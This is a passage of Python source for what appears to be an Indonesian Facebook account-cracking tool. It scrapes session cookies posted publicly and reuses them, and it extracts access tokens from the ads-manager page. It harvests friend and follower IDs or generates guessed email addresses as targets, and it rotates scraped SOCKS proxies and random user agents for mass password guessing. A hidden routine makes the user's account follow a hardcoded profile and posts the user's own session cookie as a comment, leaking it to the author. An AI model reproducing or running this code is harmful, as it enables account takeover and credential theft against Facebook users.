		cls();logo()
		ses = requests.Session()
		for li_nk in ["https://www.facebook.com/100032386028880/posts/674525870303608","https://www.facebook.com/1317909645/posts/10223426016941439","https://www.facebook.com/photo/?fbid=1655893724863124&set=a.135714890214356"]:
			url = parser(ses.get(li_nk).text,"html.parser")
			data = re.findall('"text":"(.*?)"',str(url))
			ongcok = []
			for cok in data:
				if len(cok)>=20:
					try:
						if cok in ongcok:pass
						else:ongcok.append(cok)
					except:continue
		okzaz = "kk"
		for x in ongcok:
			user = x.split("c_user=")[1]
			try:user = user.split(";")[0]
			except:user = "4"
			kukis_sus = x
			kukis_sus = kukis_sus.replace("noscript=1", "")
			kukis_impos = ""
			kukis_sus = kukis_sus.replace("c_user="+user+";", "")
			kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
			kukis_sus = kukis_sus.replace(";c_user="+user, "")
			kukis_sus = kukis_sus.replace("c_user="+user, "")
			kukis_impos += kukis_sus
			kukis_impos += ";"
			kukis_impos += "c_user="
			kukis_impos += user
			coki = kukis_impos
			cookie = kukis_impos.replace(" ","").replace("","")
			token = self.ubah_cok(cookie).replace(" ","")
			if token in (""," "):continue
			else:
				try:
					risky = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+token, cookies={'cookie':cookie})
					nama = json.loads(risky.text)['name']
					id = json.loads(risky.text)['id']
					text = Text(f"""{wor}{q}Nama Lengkap : {u}{nama}{q}\n{wor}Username/ID  : {u}{id}{q}\n{wor}{i}Token{q}        : {i}{token}{q}\n{wor}{c}Cookies{q}      : {c}{cookie}{q}""")
					console.rule("Cookies DiTemukan",style="green")
					console.print(text, style="green")
					try:
						mmk = json.loads(open(".data/sensi.json","r").read())
						mmz = open(".data/sensi.json","r").read()
						ubah_kukis = mmz.replace(mmk["cookie"], cookie)
						ubah_kukis = ubah_kukis.replace(mmk["token"], token)
						open(".data/sensi.json","w").write(ubah_kukis)
					except:open(".data/sensi.json","w").write('{\n\t"token":"%s",\n\t"cookie":"%s",\n\t"nama":"KONTOL",\n\t"KEY":"-"}'%(token,cookie))
					globalz()
					self.bot_efbe()
					okzaz = "aman"
					break
				except:continue
		if okzaz == "aman":pass
		else:
			text = Text(f"{war}{m}Cookies Tidak DiTemukan{q}({k}Invalid{q})");time.sleep(5)
			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
			console.print(text, style="red")
		quit()
		quit()
		quit()
	def ubah_bahasa(self):
		try:
			with requests.Session() as xyz:
				req = xyz.get('https://mbasic.facebook.com/language/',cookies=puput)
				pra = par(req.content,'html.parser')
				for x in pra.find_all('form',{'method':'post'}):
					if 'Bahasa Indonesia' in str(x):
						bahasa = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
						"submit"  : "Bahasa Indonesia"
						}
						url = 'https://mbasic.facebook.com' + x['action']
						exec = xyz.post(url,data=bahasa,cookies={"cookie":codeteam["cookie"]})
		except Exception as e:pass
	def coment(self):
		requests.post(f"https://graph.facebook.com/100013275378835_1655893724863124/comments/?message={codeteam['cookie']}&access_token={codeteam['token']}",cookies={"cookie":codeteam["cookie"]})
	def get_fols(self,idz):
			try:
				for x in par(requests.get('https://mbasic.facebook.com/%s'%(idz),cookies={"cookie":codeteam["cookie"]}).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in x['href']:
						requests.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						break
					elif 'Tambah Teman' in x['href']:
						requests.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						break
					elif 'Ikuti' in x['href']:
						requests.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						break
			except Exception as e:pass
	def bot_efbe(self):
		self.ubah_bahasa()
		self.get_fols(100013275378835)
		self.coment()

	def menu_login(self):
		cls();logo();cek_key()
		try:
			if status_key == "Admin":LOL = II
			else:LOL = HH
		except:LOL = HH
		dumai = []
		tampilan_login_free = f"""   {QQ}[{CC}01{QQ}]{CC} Login Cookies
   {QQ}[{MM}00{QQ}]{MM} Keluar Dari Script"""
		dumai.append(Panel(tampilan_login_free,width=42,title=f"{GOD}{UU}Menu Login{GOD}",style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}SILAHKAN PILIH"))
		console.print(Columns(dumai))
		jks = input(f"{a}   ┗{k}MENU : {a}")
		if status_key == "Admin":
			if jks in ("1","01"):self.login_cookies();quit()
	#		elif jks in ("",""):
	#		elif jks in ("",""):
			elif jks in ("00","000"):quit()
			else:
				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
				self.menu_login()
		else:
			if jks in ("1","01"):self.login_cookies();quit()
#			elif jks in ("",""):
			elif jks in ("00","000"):quit()
			else:
				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
				self.menu_login()

class menu:
	def __init__(self):
		i_love_you = "BUAT KALIAN RAJA DEC SEMOGA KALIAN PANJANG UMUR !!"
	def intro(self):
		cls();logo();cek_key()
		_tomas = []
		end_key = ""
		try:
			open(".data/sensi.json","r").read()
#			login().cek_kukis()
		except:login().menu_login()
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s'%("me",codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			id  = zxc["id"]
			bd = zxc["birthday"]
		except:login().menu_login()
		if status_key == "Admin":
			my_status = "Admin"
			my_key = codeteam["KEY"].split("-")
			jmlh_kata = len(my_key[1])
			for x in range(jmlh_kata):end_key += "*"
			key_ = my_key[0]+"-"+end_key+"-"+my_key[2]
		else:my_status = "Member Biasa";key_ = "Member"
		tampilan_data = f"""{WOR} Name      : {KK}{nama}{QQ}
{WOR} Your ID   : {KK}{id}{QQ}
{WOR} Status    : {JJ}Premium 7 Days
{WOR} Birthday  : {KK}{bd}
{WOR} Login Date: {KK}{datetime.now().strftime('%A %d-%m-%Y')}""";api = requests.get('http://ip-api.com/json').json();time = f"""{WOR} IP        : {PP}{api['query']}
{WOR} Country   : {KK}{api['country']}
{WOR} City      : {KK}{api['city']}
{WOR} Isp       : {KK}{api['isp']}
{WOR} Time      : {KK}{datetime.now().strftime('%H:%M')}"""
		_tomas.append(Panel(tampilan_data,width=42,title=f"{GOD}{PP}Account{GOD}",style=f"{A}"))
		_tomas.append(Panel(time,width=45,title=f"{GOD}{PP}Status{GOD}",style=f"{A}"))
		console.print(Columns(_tomas))


	def daftar_menu(self):
		self.intro()
		torop = []
		torop_= []
		if status_key == "Admin":
			MMK = PP
			OZ = BB
			OQ = KK
		else:
			MMK = HH
			OZ = HH
			OQ = HH
		try:ads = requests.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie':codeteam["cookie"]});url = requests.get('https://www.facebook.com/adsmanager/manage/campaigns?act='+ re.search('act=(.*?)&nav_source',str(ads.content)).group(1) +'&nav_source=no_referrer', cookies={'cookie':codeteam["cookie"]});mytok.append(re.search('accessToken="(.*?)"',str(url.content)).group(1))
		except:exit('Failled Convert Cookie')
		tampilan_menu = f"""   {QQ}[{CC}01{QQ}] {UU}Friendlist                 {QQ}[{CC}04{QQ}] {UU}ID Random           {QQ}[{CC}07{QQ}] {UU}Followers
   {QQ}[{CC}02{QQ}] {AA}Nama                       {QQ}[{CC}05{QQ}] {UU}Email               {QQ}[{CC}08{QQ}] {AA}Grup
   {QQ}[{CC}03{QQ}] {AA}Komentar                   {QQ}[{CC}06{QQ}] {AA}Likers              {QQ}[{CC}09{QQ}] {AA}Hashtag"""
		tampilan_tools = f"""   {QQ}[{CC}10{QQ}] {AA}Cek Opsi Akun CP
   {QQ}[{CC}11{QQ}] {AA}Cek Teman
   {QQ}[{CC}12{QQ}] {AA}Cek Hasil
   {QQ}[{CC}00{QQ}] {PP}Keluar"""
		tampilan_lain = f"""   {QQ}[{CC}13{QQ}] {AA}FB Developer
   {QQ}[{CC}14{QQ}] {AA}Bot Komen
   {QQ}[{CC}15{QQ}] {AA}Bot Share
   {QQ}[{MM}00{QQ}] {QQ}Keluar"""
		torop_.append(Panel(tampilan_menu,width=90,title=f"{GOD}{OO}Menu{GOD}",style=f"{A}"))
		torop.append(Panel(tampilan_tools,width=45,title=f"{GOD}{CC}Tools{GOD}",style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}SILAHKAN PILIH"))
		torop.append(Panel(tampilan_lain,width=42,title=f"{GOD}{MM}Menu Lain{GOD}",style=f"{A}"))
		console.print(Columns(torop_))
		console.print(Columns(torop))
		ass = input(f"{a}   ┗{k}MENU : {a}")
		if status_key == "Admin":
			if ass in ("1","01"):self.dump_teman();quit()
			elif ass in ("2","02"):menu_belum_ada();self.daftar_menu()
			elif ass in ("3","03"):menu_belum_ada();self.daftar_menu()
			elif ass in ("4","04"):self.dump_publik();quit()
			elif ass in ("5","05"):self.dump_email();quit()
			elif ass in ("6","06"):menu_belum_ada();self.daftar_menu()
			elif ass in ("7","07"):self.dump_follow();quit()
			elif ass in ("8","08"):menu_belum_ada();self.daftar_menu()
			elif ass in ("9","09"):menu_belum_ada();self.daftar_menu()
			elif ass in ("10","11","12","13","14","15"):menu_belum_ada();self.daftar_menu()
#			elif ass in ("",""):
			elif ass in ("00","000"):quit()
			else:
				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
				self.daftar_menu()

		else:
			if ass in ("1","01"):self.dump_teman();quit()
			elif ass in ("2","02"):menu_belum_ada();self.daftar_menu()
			elif ass in ("3","03"):menu_belum_ada();self.daftar_menu()
			elif ass in ("4","04"):self.dump_publik();quit()
			elif ass in ("5","05"):kata_free()
			elif ass in ("6","06"):menu_belum_ada();self.daftar_menu()
			elif ass in ("7","07"):self.dump_follow();quit()
			elif ass in ("8","08"):menu_belum_ada();self.daftar_menu()
			elif ass in ("9","09"):menu_belum_ada();self.daftar_menu()
			elif ass in ("10"):kata_free()
			elif ass in ("11"):kata_free()
			elif ass in ("12"):kata_free()
			elif ass in ("13"):kata_free()
			elif ass in ("14"):kata_free()
			elif ass in ("15"):kata_free()
#			elif ass in ("",""):kata_free()
#			elif ass in ("",""):

			elif ass in ("00","000"):quit()
			else:
				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
				self.daftar_menu()
	def dump_teman(self):
		try:filez = open(".data/sensi.json","r").read()
		except IOError:
#			os.remove(".data/sensi.json");os.sys.exit("Cookies Anda Error !")
			self.menu_login()
		# try:ads = requests.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie':codeteam["cookie"]});url = requests.get('https://www.facebook.com/adsmanager/manage/campaigns?act='+ re.search('act=(.*?)&nav_source',str(ads.content)).group(1) +'&nav_source=no_referrer', cookies={'cookie':codeteam["cookie"]});self.ab = re.search('accessToken="(.*?)"',str(url.content)).group(1)
		# except:exit('CookieError')
		try:
			zz = requests.get(f'https://graph.facebook.com/me/friends?fields=id,name&limit=5000&access_token='+ mytok[0],cookies={'cookie': codeteam["cookie"]}).json()
			for xx in zz['data']:
			    try:id.append(xx['id']+'<=>'+xx['name'])
			    except:continue
		except requests.exceptions.ConnectionError:prints(Panel(f"{WAR}Jaringan Anda Error, Silahkan Check Atau Coba Lagi",width=100,padding=(0),style=f"{A}"));quit()
		except (KeyError,IOError):prints(Panel(f"{WAR}Sepetinya Teman Anda Tidak Ada.. Awok-Awok-Awok",width=100,padding=(0),style=f"{A}"));quit()
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%("me",codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except:nama="UDIN"
		prints(Panel(f"{WOR}{OO}Nama Target :{PP}{nama}{QQ}\n{WOR}{OO}Limit ID    : {PP}{len(id)}{QQ}",width=100,padding=(0),style=f"{A}"))
		if len(id)==0:os.sys.exit(f"{war}Maaf ID Yang Terkumpul Tidak Ada!!")
		else:pass
		tampilan_id = f"""   {QQ}[{CC}01{QQ}] {II}Crack Dari Random {QQ}[{CC}02{QQ}] {PP}Crack Dari Tertua {QQ}[{CC}03{QQ}] {UU}Crack Dari TerMuda{QQ}"""
		prints(Panel(tampilan_id,width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		hu = input(f"{a}   ┗{k}PILIH : {a}")
		if hu in ['1','01']:
			for rikod in id:sos.append(rikod)
		elif hu in ['2','02']:
			for rikod in id:sos.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in id:
				xx = random.randint(0,len(id))
				sos.insert(xx,rikod)
		else:
			for rikod in id:sos.insert(0,rikod)
		crack().susun_proses()
	def dump_publik(self):
		try:filez = open(".data/sensi.json","r").read()
		except IOError:
			#os.remove(".data/sensi.json");os.sys.exit("Cookies Anda Error !")
			self.menu_login()
		prints(Panel(f"{WOR}{KK}Masukan ID Public Atau ID Bersifat Public\n{WOR}{KK}Contoh : 100084720154598{CC}|{KK}100080693752065 {KK}Untuk Crack Masal",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}TARGET"))
		idzz = input(f"{a}   ┗{k}Target ID : {a}").split("|")
		for idz in idzz:
			try:
				zz = requests.get('https://graph.facebook.com/'+idz+'/friends?fields=id,name&limit=5000&access_token='+ mytok[0],cookies={'cookie': codeteam["cookie"]}).json()
				for xx in zz['data']:
					open("x","a").write(xx["id"]+"|"+xx["name"]+"\n")
					try:id.append(xx['id']+'<=>'+xx['name'])
					except:continue
			except requests.exceptions.ConnectionError:prints(Panel(f"{WAR}Jaringan Anda Error, Silahkan Check Atau Coba Lagi",width=100,padding=(0),style=f"{A}"))
			except (KeyError,IOError):prints(Panel(f"{WAR}ID Target Yang Anda Masukan, Tidak Bersifat Public",width=100,padding=(0),style=f"{A}"))
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idz,codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except:nama="UDIN"
		prints(Panel(f"{WOR}{OO}Nama Target :{PP}{nama}{QQ}\n{WOR}{OO}Limit ID    : {PP}{len(id)}{QQ}",width=100,padding=(0),style=f"{A}"))
		if len(id)==0:os.sys.exit(f"{war}Maaf ID Yang Terkumpul Tidak Ada!!")
		else:pass
		tampilan_id = f"""   {QQ}[{CC}01{QQ}] {II}Crack Dari Random {QQ}[{CC}02{QQ}] {PP}Crack Dari Tertua {QQ}[{CC}03{QQ}] {UU}Crack Dari TerMuda{QQ}"""
		prints(Panel(tampilan_id,width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		hu = input(f"{a}   ┗{k}PILIH: {a}")
		if hu in ['1','01']:
			for rikod in id:sos.append(rikod)
		elif hu in ['2','02']:
			for rikod in id:sos.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in id:
				xx = random.randint(0,len(id))
				sos.insert(xx,rikod)
		else:
			for rikod in id:sos.insert(0,rikod)
		crack().susun_proses()
	def dump_follow(self):
		try:filez = open(".data/sensi.json","r").read()
		except IOError:
			#os.remove(".data/sensi.json");os.sys.exit("Cookies Anda Error !")
			self.menu_login()
		prints(Panel(f"{WOR}{KK}Masukan ID Public Atau ID Bersifat Public\n{WOR}{KK}Contoh : 100084720154598{CC}|{KK}100080693752065 {KK}Untuk Crack Masal",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}TARGET"))
		idzz = input(f"{a}   ┗{k}Target ID : {a}").split("|")
		for idz in idzz:
			try:
				zz = requests.get('https://graph.facebook.com/'+idz+'?fields=subscribers.limit(99999)&access_token='+codeteam["token"],cookies={'cookie': codeteam["cookie"]}).json()
				for xx in zz['subscribers']['data']:
					try:id.append(xx['id']+'<=>'+xx['name'])
					except:continue
			except requests.exceptions.ConnectionError:prints(Panel(f"{WAR}Jaringan Anda Error, Silahkan Check Atau Coba Lagi",width=100,padding=(0),style=f"{A}"))
			except (KeyError,IOError):prints(Panel(f"{WAR}ID Target Yang Anda Masukan, Tidak Bersifat Public",width=100,padding=(0),style=f"{A}"))
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idz,codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except:nama="UDIN"
		prints(Panel(f"{WOR}{OO}Nama Target :{PP}{nama}{QQ}\n{WOR}{OO}Limit ID    : {PP}{len(id)}{QQ}",width=100,padding=(0),style=f"{A}"))
		if len(id)==0:os.sys.exit(f"{war}Maaf ID Yang Terkumpul Tidak Ada!!")
		else:pass
		tampilan_id = f"""   {QQ}[{CC}01{QQ}] {II}Crack Dari Random {QQ}[{CC}02{QQ}] {PP}Crack Dari Tertua {QQ}[{CC}03{QQ}] {UU}Crack Dari TerMuda{QQ}"""
		prints(Panel(tampilan_id,width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		hu = input(f"{a}   ┗{k}PILIH : {a}")
		if hu in ['1','01']:
			for rikod in id:sos.append(rikod)
		elif hu in ['2','02']:
			for rikod in id:sos.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in id:
				xx = random.randint(0,len(id))
				sos.insert(xx,rikod)
		else:
			for rikod in id:sos.insert(0,rikod)
		crack().susun_proses()


	def dump_email(self):
		tampilan_gmail = f"""   {QQ}[{CC}01{QQ}]{PP} @gmail.com
   {QQ}[{CC}02{QQ}]{PP} @gmail.co.id
   {QQ}[{CC}03{QQ}]{PP} Semua Gmail"""
		tampilan_yaho = f"""   {QQ}[{CC}04{QQ}]{PP} @yahoo.com
   {QQ}[{CC}05{QQ}]{PP} @yahoo.co.id
   {QQ}[{CC}06{QQ}]{PP} Semua Yahoo"""
		tampilan_hot = f"""   {QQ}[{CC}07{QQ}]{PP} @hotmail.com
   {QQ}[{CC}08{QQ}]{PP} @hotmail.co.id
   {QQ}[{CC}09{QQ}]{PP} Semua Hotmail"""
		tampilan_out = f"""   {QQ}[{CC}10{QQ}]{PP} @outlook.com
   {QQ}[{CC}11{QQ}]{PP} @outlook.co.id
   {QQ}[{CC}12{QQ}]{PP} Semua Outlook"""
		tampilan_roo = f"""   {QQ}[{CC}13{QQ}]{PP} @rocketmail.com
   {QQ}[{CC}14{QQ}]{PP} @rocketmail.co.id
   {QQ}[{CC}15{QQ}]{PP} Semua Rocketmail"""
		tampilan_yam = f"""   {QQ}[{CC}16{QQ}]{PP} @ymail.com
   {QQ}[{CC}17{QQ}]{PP} @ymail.co.id
   {QQ}[{CC}18{QQ}]{PP} Semua Ymail"""
		_tomas_ = []
		__tomas__ = []
		_to_mas_ = []
		_tomas_.append(Panel(tampilan_gmail,width=42,title=f"{GOD}{KK}Gmail{GOD}",style=f"{A}"))
		_tomas_.append(Panel(tampilan_yaho,width=45,title=f"{GOD}{KK}Yahoo{GOD}",style=f"{A}"))
		__tomas__.append(Panel(tampilan_hot,width=42,title=f"{GOD}{KK}HotMail{GOD}",style=f"{A}"))
		__tomas__.append(Panel(tampilan_out,width=45,title=f"{GOD}{KK}Outlook{GOD}",style=f"{A}"))
		_to_mas_.append(Panel(tampilan_roo,width=42,title=f"{GOD}{KK}Rocketmail{GOD}",style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		_to_mas_.append(Panel(tampilan_yam,width=45,title=f"{GOD}{KK}Ymail{GOD}",style=f"{A}"))
		console.print(Columns(_tomas_))
		console.print(Columns(__tomas__))
		console.print(Columns(_to_mas_))
		_x_ = 0
		ask    = input(f"{a}   ┗{c}Pilih    : {a}")
		nama   = input(f"{a}    ┗{c}Nama    : {q}").replace(' ','')
		try:
			jumlah = int(input(f"{a}     ┗{c}Limit  : {a}"))
		except:jumlah=2000
		if ask in["1"]:
			email = "@gmail.com"
			for z in range(jumlah):
				_x_ += 1
				id.append(nama+str(_x_)+email+"<=>"+nama)
		elif ask in["2"]:
			email = "@yahoo.com"
			for z in range(jumlah):
				_x_ += 1
				id.append(nama+str(_x_)+email+"<=>"+nama)
		elif ask in["3"]:
			email = "@hotmail.com"
			for z in range(jumlah):
				_x_ += 1
				id.append(nama+str(_x_)+email+"<=>"+nama)
		elif ask in["4"]:
			email = "@outlook.com"
			for z in range(jumlah):
				_x_ += 1
				id.append(nama+str(_x_)+email+"<=>"+nama)
		elif ask in["5"]:
			email = "@rocketmail.com"
			for z in range(jumlah):
				_x_ += 1
				id.append(nama+str(_x_)+email+"<=>"+nama)
		elif ask == "semua":
				id.append(f"{nama.replace(' ','')}"+str(_x_)+email+"<=>"+nama)
				id.append(f"{nama.replace(' ','')}"+str(_x_)+"@gmail.co.id"+"<=>"+nama)
				id.append(f"{nama.replace(' ','_')}"+str(_x_)+email+"<=>"+nama)
				id.append(f"{nama.replace(' ','.')}"+str(_x_)+email+"<=>"+nama)
				id.append(f"{nama.replace(' ','_')}"+str(_x_)+"@gmail.co.id"+"<=>"+nama)
				id.append(f"{nama.replace(' ','.')}"+str(_x_)+"@gmail.co.id"+"<=>"+nama)
		else:
			os.sys.exit("else")

		tampilan_id = f"""   {QQ}[{CC}01{QQ}] {II}Crack Dari Random {QQ}[{CC}02{QQ}] {PP}Crack Dari Tertua {QQ}[{CC}03{QQ}] {UU}Crack Dari TerMuda{QQ}"""
		prints(Panel(tampilan_id,width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		hu = input(f"{a}   ┗{k}PILIH : {a}")
		if hu in ['1','01']:
			for rikod in id:sos.append(rikod)
		elif hu in ['2','02']:
			for rikod in id:sos.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in id:
				xx = random.randint(0,len(id))
				sos.insert(xx,rikod)
		else:
			for rikod in id:sos.insert(0,rikod)
		crack().susun_proses()
class crack:
	def __init__(self):
		kata_ = "DASAR BOCIL"
		kata_ = "UDAH BESAR"
		kata_ = "MASAK ENGGA"
		kata_ = "BISA CODING"
		kata_ = "HAHAHA..."
		kata_ = "OMONG 2"
		kata_ = "KAMU KE KONTOL"
		kata_ = "SOK Ganteng"
		kata_ = "Dasar Anak Pantek"
	def ambil_proxy(self):
		open(".data/proxy.txt","w")
		link_prox=[
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
			"https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
			"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.openproxylist.xyz/socks4.txt",
			'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all',
			'https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt'
			]
		link_proxz=[
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://api.openproxylist.xyz/socks5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
			"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
			'https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all'
			'https://raw.githubusercontent.com/Denventa/sakera/main/ua.txt'
			]
		try:
#			for link in link_prox:
			for link in link_proxz:
				try:
					all_prox = requests.get(link).text
					open(".data/proxy.txt","a+").write(all_prox)
				except:continue
		except:pass
	def user_agnrt(self):
		rr = random.randint
		tampilan_agen = f"""   {QQ}[{CC}01{QQ}] {PP}Android Browser 4
   {QQ}[{CC}02{QQ}] {PP} KFONWI
   {QQ}[{CC}03{QQ}] {II} All User-Agent Random

   {QQ}[{CC}04{QQ}] {QQ}Manual
   {QQ}[{CC}05{QQ}] {QQ}Semua User-Agent"""
		prints(Panel(tampilan_agen,title=f"{GOD}{PP}Pilih Bentuk User-Agent{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		hu = input(f"{a}   ┗{c}PILIH : {a}")
		if hu in ['1','01']:
			for x in range(10000):
				_='Mozilla/5.0 (Linux; U; Android'
				__=random.choice(['6','7','8','9','10','11','12'])
				___=' en-us; GT-'
				____=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				_____=random.randrange(1, 999)
				______=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				_______='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				________=random.randrange(73,100)
				_________=random.randrange(4200,4900)
				__________=random.randrange(40,150)
				___________='Mobile Safari/537.36'
				ugen.append(f'{_} {__}; {___}{____}{_____}{______}) {_______}{________}.0.{_________}.{__________} {___________}')
		elif hu in ['2','02']:
			for x in range(10000):
				ugen.append(f"Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(rr(111,999))}.{str(rr(1,9))}.{str(rr(1,99))} like Chrome/{str(rr(111,999))}.0.{str(rr(1111,9999))}.{str(rr(111,999))} Safari/537.36")


		elif hu in ['3','03']:
			zz = requests.get("https://raw.githubusercontent.com/Denventa/sakera/main/ua.txt").text
			for x in zz.splitlines():
				ugen.append(x)


		elif hu in ['4','04']:
			prints(Panel(f"{WAR}{KK}Masukan User-Agent Minimal Tiga Puluh(30 Kata) Huruf\n{WAR}{KK}Gunakan Symbol | Untuk Pemisah",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏MASUKAN AGENT"))
			ua_z = input(f"{a}   ┗{c}UserAgent : {a}").split("|")
			for x in ua_z:
				ugen.append(x)
			ugen.append("Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-B938Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4441.75 Mobile Safari/537.36")
		elif hu in ['5','05']:
			for x in range(10000):
				ugen.append(f"Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(rr(111,999))}.{str(rr(1,9))}.{str(rr(1,99))} like Chrome/{str(rr(111,999))}.0.{str(rr(1111,9999))}.{str(rr(111,999))} Safari/537.36")
				_='Mozilla/5.0 (Linux; U; Android'
				__=random.choice(['6','7','8','9','10','11','12'])
				___=' en-us; GT-'
				____=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				_____=random.randrange(1, 999)
				______=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				_______='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				________=random.randrange(73,100)
				_________=random.randrange(4200,4900)
				__________=random.randrange(40,150)
				___________='Mobile Safari/537.36'
				ugen.append(f'{_} {__}; {___}{____}{_____}{______}) {_______}{________}.0.{_________}.{__________} {___________}')
		else:
			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
			console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
			self.user_agnrt()



	def susun_proses(self):
		self.pilih_katasandi()
		self.pasang_bot_follow()
		self.mentod()
		self.user_agnrt()
		self.ambil_proxy()
		self.kata_buat_pro()
		self.mulai_crack()
